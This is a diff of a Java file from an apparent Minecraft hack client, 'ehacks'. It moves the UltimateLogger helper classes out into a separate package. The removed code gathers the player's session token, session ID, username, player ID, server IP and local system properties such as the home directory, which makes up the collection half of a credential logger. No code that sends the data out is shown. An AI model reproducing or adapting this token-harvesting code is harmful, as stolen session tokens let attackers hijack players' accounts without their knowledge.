@@ -6,6 +6,8 @@
 package ehacks.mod.util;
 
 import com.google.gson.Gson;
+import ehacks.mod.util.ultimatelogger.LoginInfo;
+import ehacks.mod.util.ultimatelogger.ServerLoginData;
 import ehacks.mod.wrapper.Wrapper;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -67,54 +69,5 @@ public class UltimateLogger {
                 ex.printStackTrace(System.err);
             }
         }
-    }
-    
-    private class LoginInfo {
-        public SessionInfo session = new SessionInfo();
-        public boolean ismcp = Mappings.isMCP();
-        public long time = System.currentTimeMillis();
-        public ArrayList<PropertyInfo> sysprops = new ArrayList<PropertyInfo>();
-        
-        public LoginInfo() {
-            ArrayList<String> tlist = new ArrayList<String>();
-            tlist.add("java.runtime.name");
-            tlist.add("java.vm.version");
-            tlist.add("user.country");
-            tlist.add("user.dir");
-            tlist.add("java.runtime.version");
-            tlist.add("os.arch");
-            tlist.add("os.name");
-            tlist.add("user.home");
-            tlist.add("user.language");
-            for (String key : tlist) {
-                try {
-                    sysprops.add(new PropertyInfo(key, System.getProperty(key)));
-                } catch (Exception e) {
-                    
-                }
-            }
-        }
-    }
-    
-    private class SessionInfo {
-        public String username = Wrapper.INSTANCE.mc().getSession().getUsername();
-        public String playerid = Wrapper.INSTANCE.mc().getSession().getPlayerID();
-        public String token = Wrapper.INSTANCE.mc().getSession().getToken();
-        public String session = Wrapper.INSTANCE.mc().getSession().getSessionID();
-    }
-    
-    private class PropertyInfo {
-        public String key = "";
-        public String value = "";
-        
-        public PropertyInfo(String key, String value) {
-            this.key = key;
-            this.value = value;
-        }
-    }
-    
-    private class ServerLoginData {
-        public SessionInfo session = new SessionInfo();
-        public String serverip = Wrapper.INSTANCE.mc().func_147104_D() == null ? "single" : Wrapper.INSTANCE.mc().func_147104_D().serverIP;
     }
 }
